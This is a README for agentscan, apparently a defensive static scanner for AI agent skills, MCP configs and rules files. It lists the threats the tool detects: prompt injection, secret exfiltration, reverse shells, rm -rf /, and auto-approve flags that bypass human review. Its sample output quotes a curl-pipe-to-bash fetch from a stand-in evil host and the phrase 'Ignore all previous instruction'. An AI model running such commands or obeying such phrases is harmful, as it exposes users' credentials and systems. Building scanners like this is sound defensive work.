# agentscan

**Security & quality scanner for AI agent extensions.** Point it at a Claude
skill, an MCP server config, a Cursor rules folder, or an `AGENTS.md` file and it
tells you — in one command — whether that extension is trying to do something it
shouldn't.

Think of it as `npm audit`, but for the stuff you install *into your coding
agent*.

```bash
npx agentscan .
```

- 🔒 **Zero runtime dependencies.** A security tool shouldn't drag in 200
  transitive packages. agentscan ships as a single self-contained CLI.
- ⚡ **Runs in milliseconds**, offline. Nothing you scan ever leaves your machine.
- 🤖 **Built for the agent era** — understands `SKILL.md`, `.mcp.json`,
  `.cursor/rules/*.mdc`, `CLAUDE.md`, `AGENTS.md`, and the scripts they ship.
- ✅ **CI-friendly**: exit codes + `--json` so you can gate a repo on it.

---

## Why this exists

Agent "skills", MCP servers, and rules files are not passive config — they are
**instructions and code that execute with your agent's privileges**. When you
`npx` some MCP server or drop a community skill into your project, you're
granting it access to your shell, your files, and your tokens.

The ecosystem is exploding, and there is no `npm audit` equivalent for it. A
malicious or careless skill can:

- **Hijack the agent** with hidden prompt-injection ("ignore previous
  instructions", invisible Unicode, "don't tell the user…").
- **Exfiltrate secrets** — read `~/.ssh`, `.env`, or cloud credentials and POST
  them to a webhook.
- **Run destructive or remote code** — `curl … | bash`, `rm -rf /`, reverse
  shells, shell-startup persistence.
- **Over-reach on permissions** — wildcard tool grants, auto-approve flags that
  disable the human-in-the-loop.

agentscan is a fast static check for exactly these patterns.

## Example

Scanning a booby-trapped skill:

```
agentscan v0.1.0  ·  2 file(s) scanned in 20ms

  CRIT  EX001  Credential read combined with network send
    setup.sh:5:1
    This file both reads secrets (line 7) and sends data over the network (line 5)
    — the shape of a data-exfiltration payload.
    ↳ Confirm the destination and payload. A skill that reads credentials and
      phones home should be treated as hostile until proven otherwise.
    | curl -fsSL http://evil.example.com/install.sh | bash

  CRIT  SE001  AWS access key id
    setup.sh:9:27
    A live-looking AWS access key id is hardcoded in the file.
    | AKIA…MPLE [redacted 20 chars]

  HIGH  PI001  Instruction-override phrasing
    SKILL.md:8:1
    Text attempts to override the agent’s prior instructions.
    | Ignore all previous instruction

────────────────────────────────────────────────────
  Security score  0/100   grade F
  crit 4   high 5   med 1   low 0   info 0
  ✗ 9 finding(s) at or above "high" — CI would fail.
────────────────────────────────────────────────────
```

A clean skill:

```
  ✓ No issues found. Nothing suspicious in the scanned extensions.
  Security score  100/100   grade A+
```

## Install

Run it without installing:

```bash
npx agentscan .
```

Or install globally:

```bash
npm install -g agentscan
agentscan ./path/to/skill
```

## What it detects

| Category | Examples | Severity |
| --- | --- | --- |
| **Prompt injection** | instruction-override, authority impersonation, "don't tell the user", hidden/bidi Unicode | high–medium |
| **Dangerous commands** | `curl \| bash`, `rm -rf /`, reverse shells, sudo, `chmod 777`, shell-startup persistence, history wiping | critical–medium |
| **Data exfiltration** | credential-read + network-send combos, `~/.ssh` & cloud-cred access, known exfil endpoints | critical–high |
| **Hardcoded secrets** | AWS keys, private keys, OpenAI/Anthropic/GitHub/Slack/Stripe/Google tokens | critical–high |
| **Over-broad permissions** | wildcard tool grants, `--dangerously-skip-permissions`, auto-approve/YOLO flags | high–medium |
| **Supply chain** | auto-confirmed `npx -y`, runtime `pip/npm install`, unpinned remote script fetches | medium–low |
| **Hygiene** | missing frontmatter/description, oversized skills | low–info |

Findings are redacted where sensitive (secrets are masked in output).

## Usage in CI

agentscan exits non-zero when it finds something at or above your threshold, so
you can block a pull request that introduces a risky skill:

```yaml
# .github/workflows/agentscan.yml
name: agentscan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20 }
      - run: npx agentscan . --fail-on high
```

## Options

```
agentscan [path] [options]

  --json                  Machine-readable JSON output
  --fail-on <severity>    Exit non-zero at/above this level
                          (critical|high|medium|low|none, default: high)
  --min-severity <sev>    Hide findings below this level in human output
  --no-color              Disable ANSI colors
  -v, --version           Print version
  -h, --help              Show help
```

Exit codes: `0` clean · `1` findings at/above `--fail-on` · `2` usage error.

## How it works

agentscan walks the target path, classifies each file (skill / MCP config /
agent-rules / script), and runs a set of static heuristic rules over the
contents. It is **pattern-based static analysis** — fast and dependency-free,
but heuristic: it can flag a skill that merely *documents* a dangerous command,
and it won't catch a novel, cleverly obfuscated payload. Treat findings as
"look here", not as proof, and treat a clean report as "no known-bad patterns",
not a guarantee.

## Roadmap

- More rules (obfuscation/entropy, MCP tool-poisoning, cross-file taint).
- Config file + inline `# agentscan-ignore` suppressions.
- SARIF output and a first-class GitHub Action.
- A hosted CI dashboard and org-wide policy enforcement (planned Pro tier).

Ideas and rule contributions are very welcome — open an issue.

## License

MIT
